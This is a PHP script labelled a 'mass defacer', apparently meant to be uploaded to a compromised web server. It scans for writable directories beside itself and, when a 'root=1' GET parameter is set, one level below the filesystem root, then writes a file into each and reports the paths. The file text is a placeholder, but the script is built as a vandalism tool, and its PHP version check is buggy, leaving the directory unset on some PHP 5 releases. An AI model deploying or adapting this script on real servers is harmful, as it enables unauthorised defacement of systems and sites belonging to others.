<?php

# pwndirs.php - Mass defacer. What?
# v. 2018-04-19

define('DS','/');

# Functions
##

# Find current dir based on PHP ver
function current_dir() {
    $vers[0] = '1';
    $vers[1] = '1';

    if ( function_exists('phpversion') ) {
        $vers = explode('.', substr(phpversion(), 0, 3));
    }

    if ($vers[0] <= 5) {
        if ($vers[1] <= 3) {
            $cur_dir = dirname(__FILE__);
        }
    } else {
        $cur_dir = __DIR__;
    }
    return $cur_dir;
}

# Variables
##

$dir = current_dir();
$files_array = scandir($dir);
$root_array = scandir('/');
$dirs_array = [];
$file_name = 'test.txt';
$file_content = 'This is a test.';

# Main
##

# Find writable dirs below __DIR__
foreach ($files_array as $file) {
    $dirs_path = $dir . DS . $file;

    if ($file === '.' or $file === '..') {
        continue;
    } elseif ( is_dir($dirs_path) ) {
        if ( is_writable($dirs_path) ) {
            array_push($dirs_array, $dirs_path);
        }
    }
}

# Find writable dirs a level below root
if ( isset($_GET['root']) && $_GET['root'] === '1' ) {
    foreach ($root_array as $file) {
        $dirs_path = DS . $file;

        if ($file === '.' or $file === '..' or $file === 'lost+found') {
            continue;
        } elseif ( is_dir($dirs_path) ) {
            if ( is_writable($dirs_path) ) {
                array_push($dirs_array, $dirs_path);
            }
        }
    }
}

# Scribble
if ( function_exists('file_put_contents') ) {
    echo "<!doctype html>\n<html lang=en>\n<title>.</title>\n<body>\n";
    foreach ($dirs_array as $pwned) {
        $file = $pwned . DS . $file_name;
        if ( file_put_contents($file, $file_content) ) {
            echo "Wrote to $file<br>\n";
        }
    }
}
